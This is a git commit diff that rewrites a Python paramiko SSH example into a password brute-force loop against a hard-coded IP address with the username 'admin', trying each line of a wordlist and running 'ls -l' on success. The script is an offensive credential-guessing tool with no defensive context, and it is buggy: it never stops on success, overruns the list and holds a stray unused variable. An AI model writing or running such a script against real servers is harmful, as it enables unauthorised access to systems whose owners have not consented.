117d4f2fa9e2f6c1877ed2a01d366718400a97fc
J R Deva Dattan <jrdevadattan2006@gmail.com>
2025-09-06 10:24:26 +0530

    Update main.py to loop through wordlists

--- main.py
+++ main.py
@@ -1,28 +1,36 @@
 import paramiko
 
-hostname = 'your_server_ip_or_hostname'
-username = 'your_username'
-password = 'your_password'
+hostname = '20.205.18.148'
+username = 'admin'
+wordlistPath = './wor'
+
+wordListFile = open("wordlist.txt", "r", encoding="utf-8", errors="ignore")
+words = [line.strip() for line in wordListFile]
 
 client = paramiko.SSHClient()
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-try:
-    client.connect(hostname, username=username, password=password)
-    stdin, stdout, stderr = client.exec_command('ls -l')
-    output = stdout.read().decode('utf-8')
-    error = stderr.read().decode('utf-8')
-    if output:
-        print("Command Output:")
-        print(output)
-    if error:
-        print("Command Error:")
-        print(error)
-except paramiko.AuthenticationException:
-    print("Authentication failed.")
-except paramiko.SSHException as e:
-    print(f"SSH connection error: {e}")
-except Exception as e:
-    print(f"An unexpected error occurred: {e}")
-finally:
-    client.close()
+i = 0
+while True:
+    password = words[i]
+    try:
+        client.connect(hostname, username=username, password=password)
+        stdin, stdout, stderr = client.exec_command('ls -l')
+        output = stdout.read().decode('utf-8')
+        error = stderr.read().decode('utf-8')
+        if output:
+            print("Command Output:")
+            print(output)
+        if error:
+            print("Command Error:")
+            print(error)
+    except paramiko.AuthenticationException:
+        print("Authentication failed.")
+    except paramiko.SSHException as e:
+        print(f"SSH connection error: {e}")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+    finally:
+        client.close()
+        wordListFile.close()
+    i += 1
